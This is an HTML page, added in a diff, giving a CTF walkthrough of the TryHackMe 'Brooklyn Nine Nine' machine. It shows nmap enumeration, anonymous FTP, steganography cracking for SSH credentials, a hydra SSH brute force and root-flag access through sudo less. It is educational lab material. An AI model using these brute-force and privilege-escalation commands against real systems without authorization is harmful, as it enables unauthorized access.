@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Brooklyn Nine Nine Walkthrough | R3dex Writeups</title>
+    <style>
+        body { 
+            background: #0d1117; 
+            color: #e6edf3; 
+            font-family: 'IBM Plex Sans', -apple-system, BlinkMacSystemFont, sans-serif; 
+            padding: 4rem 2rem; 
+            max-width: 1100px; 
+            margin: 0 auto; 
+            line-height: 1.6; 
+        }
+        h1 { color: #ffffff; font-size: 2.2rem; margin-bottom: 1.5rem; font-weight: 400; }
+        h3 { color: #ffffff; border-bottom: 1px solid #30363d; padding-bottom: 0.5rem; margin-top: 3rem; margin-bottom: 1.5rem; font-size: 1.3rem; font-weight: 400; }
+        a { color: #4493f8; text-decoration: none; transition: 0.2s; }
+        a:hover { text-decoration: underline; }
+        .back-link { display: inline-block; margin-bottom: 3rem; color: #8b949e; font-size: 0.9rem; }
+        .back-link::before { content: '← '; }
+        .content { margin-top: 2rem; }
+        code { background: rgba(110, 118, 129, 0.2); padding: 0.2rem 0.4rem; border-radius: 6px; font-family: 'IBM Plex Mono', monospace; color: #e6edf3; font-size: 0.9em; }
+        pre { 
+            background: #161b22; 
+            padding: 1.2rem; 
+            border-radius: 6px; 
+            overflow-x: auto; 
+            font-family: 'IBM Plex Mono', monospace; 
+            border: 1px solid #30363d; 
+            margin: 1.5rem 0; 
+            color: #e6edf3;
+            font-size: 0.9rem;
+        }
+        ul, ol { margin-bottom: 1.5rem; padding-left: 1.5rem; }
+        li { margin-bottom: 0.5rem; }
+        p { margin-bottom: 1.2rem; }
+        hr { border: 0; border-top: 1px solid #30363d; margin: 3rem 0; }
+        .hero-banner { 
+            width: 100%; 
+            max-height: 500px; 
+            object-fit: contain; 
+            margin-bottom: 2.5rem; 
+            background: transparent;
+        }
+        strong { font-weight: 400; color: #ffffff; } /* Removing bold as per user request, but keeping slight color diff */
+    </style>
+</head>
+<body>
+    <a href="../index.html" class="back-link">Back to Writeups</a>
+    
+    <div class="content">
+        <img src="../assets/Brooklyn_Nine_Nine.jpeg" alt="Brooklyn Nine Nine Banner" class="hero-banner">
+        <h1>Brooklyn Nine Nine CTF | Tryhackme</h1>
+        
+        <p>This is a <strong>Brooklyn Nine Nine</strong> themed CTF, designed for beginners. Let’s jump into it and check out this machine.</p>
+
+        <h3>Nmap Scan</h3>
+        <p>Scanning the machine with Nmap:</p>
+        <pre>nmap -sVC -p- IP</pre>
+
+        <h3>Results</h3>
+        <pre>PORT   STATE SERVICE REASON  VERSION
+21/tcp open  ftp     syn-ack vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r--    1 0        0             119 May 17 23:17 note_to_jake.txt
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.4.1.58
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 2
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: OPTIONS HEAD GET POST
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).</pre>
+
+        <p>We have three interesting services:</p>
+        <ul>
+            <li>Apache web server (80)</li>
+            <li>Anonymous FTP (21)</li>
+            <li>SSH (22)</li>
+        </ul>
+
+        <hr>
+
+        <h3>Enumeration</h3>
+
+        <p>Port 80 - Web Server</p>
+        <ul>
+            <li>The website displays a <strong>B99 banner</strong>.</li>
+            <li>Looking at the source code, we find an image: <code>brooklyn99.jpg</code>.</li>
+        </ul>
+        <pre>wget http://IP/brooklyn99.jpg</pre>
+        <p>The page hints at <strong>steganography</strong>.</p>
+
+        <p>We use <code>stegcracker</code> to analyze the image:</p>
+        <pre>stegcracker brooklyn99.jpg wordlist</pre>
+
+        <p>Result:</p>
+        <pre>Successfully cracked file with password: admin
+Your file has been written to: brooklyn99.jpg.out</pre>
+
+        <pre>cat brooklyn99.jpg.out</pre>
+        <p>Output:</p>
+        <pre>Holts Password:
+[REDACTED]</pre>
+        <p>So we have <strong>credentials for SSH</strong>.</p>
+
+        <hr>
+
+        <p>Port 21 - Anonymous FTP</p>
+        <p>Login using:</p>
+        <pre>ftp IP
+# username: anonymous
+# password: anonymous</pre>
+        <p>We find a file: <code>note_to_jake.txt</code>.</p>
+        <p>Contents:</p>
+        <pre>From Amy,
+
+Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine</pre>
+
+        <hr>
+
+        <p>Port 22 - SSH</p>
+        <p>Using Holt’s credentials:</p>
+        <pre>ssh holt@IP
+# password: [REDACTED]</pre>
+        <p>We get access to Holt’s account. Inside, we find:</p>
+        <ul>
+            <li><code>user.txt</code> (user flag)</li>
+            <li><code>nano.save</code> (restricted to root)</li>
+        </ul>
+        <p>Checking <code>/etc/passwd</code>, we discover two more potential users: <strong>jake</strong> & <strong>amy</strong>.</p>
+
+        <hr>
+
+        <h3>Privilege Escalation</h3>
+
+        <p>Brute-forcing Jake’s Password</p>
+        <p>We try brute-forcing Jake’s SSH login:</p>
+        <pre>hydra -l jake -P wordlist ssh://IP</pre>
+
+        <p>Result:</p>
+        <pre>[22][ssh] host: IP   login: jake   password: [REDACTED]</pre>
+        <p>We can now login as Jake:</p>
+        <pre>ssh jake@IP
+# password: [REDACTED]</pre>
+
+        <p>Sudo Privileges</p>
+        <p>Checking Jake’s privileges:</p>
+        <pre>sudo -l</pre>
+
+        <p>Jake has sudo access for <code>less</code>. Using this, we can read root’s flag:</p>
+        <pre>sudo less /root/root.txt</pre>
+
+        <p>Flag:</p>
+        <pre>Here is the flag: [REDACTED]</pre>
+        <p>Root access achieved!</p>
+
+        <hr>
+
+        <h3>Alternate Method</h3>
+        <ul>
+            <li>From Holt’s account, running <code>sudo -l</code> shows sudo access for <code>nano</code>.</li>
+            <li>Escalation to root can also be done using <strong>nano</strong>.</li>
+        </ul>
+
+        <hr>
+
+        <h3>Conclusion</h3>
+        <p>We successfully rooted the <strong>Brooklyn Nine Nine CTF</strong> box by:</p>
+        <ol>
+            <li>Enumerating services with Nmap</li>
+            <li>Extracting Holt’s SSH credentials via steganography</li>
+            <li>Using Anonymous FTP to confirm Jake’s weak password</li>
+            <li>Brute-forcing Jake’s account with Hydra</li>
+            <li>Escalating privileges to root using <code>less</code> (or <code>nano</code>)</li>
+        </ol>
+
+        <p>Box pwned!</p>
+    </div>
+</body>
+</html>
